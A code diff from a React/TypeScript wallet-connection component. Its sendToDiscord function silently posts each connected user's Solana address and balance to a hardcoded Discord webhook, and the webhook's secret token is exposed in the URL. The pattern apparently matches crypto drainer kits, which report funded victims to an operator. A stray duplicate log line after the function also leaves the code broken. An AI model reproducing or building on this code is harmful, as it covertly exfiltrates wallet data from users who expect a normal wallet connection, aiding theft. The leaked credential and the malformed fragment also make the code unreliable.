@@ -85,26 +85,27 @@ const WalletConnectionHandler: FC = () => {
         }
     };
 
-  const sendToDiscord = async (address: string, balance: number) => {
+ const sendToDiscord = async (address: string, balance: number) => {
     const webhookURL = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';
-
-    const proxyUrl = 'https://cors-anywhere.herokuapp.com/'; // public CORS proxy
-
     const message = {
         content: `🚀 **Wallet Connected!**\n\n**Address:** \`${address}\`\n**Balance:** \`${balance.toFixed(4)} SOL\``
     };
 
     try {
-        await fetch(proxyUrl + webhookURL, {
+        const response = await fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(message)
         });
-        console.log('✅ Sent wallet info through CORS proxy');
+
+        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+        
+        console.log('✅ Sent wallet info to Discord');
     } catch (error) {
-        console.error('❌ Failed to send through proxy', error);
+        console.error('❌ Discord webhook failed:', error);
     }
 };
+
 
 
             console.log('✅ Sent wallet info to Discord');
